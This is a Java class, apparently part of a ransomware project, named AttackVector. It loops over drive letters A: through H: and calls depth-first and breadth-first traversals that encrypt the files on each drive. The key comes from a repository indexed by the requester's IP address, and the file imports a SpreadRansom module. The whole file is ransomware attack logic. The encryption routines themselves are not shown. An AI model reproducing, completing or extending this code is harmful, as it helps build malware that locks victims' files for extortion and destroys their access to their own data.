package Agent.Attack;

import java.io.File;
import java.util.Collection;
import java.util.Collections;

import javax.inject.Inject;
import javax.servlet.http.HttpServletRequest;

import Agent.SpreadR.SpreadRansom;
import Agent.traversal.*;
import server.entities.CryptoKey;
import server.exceptions.RansomwareException;
import server.repositories.KeyRepository;

public class AttackVector {

	@Inject
	private KeyRepository rep;
	private HttpServletRequest request;

	public void attack(String inputDir, Collection<File> dirs,CryptoKey key) throws RansomwareException {
		Traverse dfs = new DFS();
		dfs.traverseAndEncrypt(inputDir, dirs, key);
		// or
		Traverse bfs = new BFS();
		bfs.traverseAndEncrypt(inputDir, dirs,key);

	}

	public void encryptFileSystem() throws RansomwareException {

		Collection<File> visitedFolders = Collections.emptySet();
		CryptoKey key = rep.findById(request.getRemoteAddr()).get();
		for (char i = 'A'; i <= 'H'; i++) {
			attack(i + ":\\", visitedFolders, key);

		}

	}

}
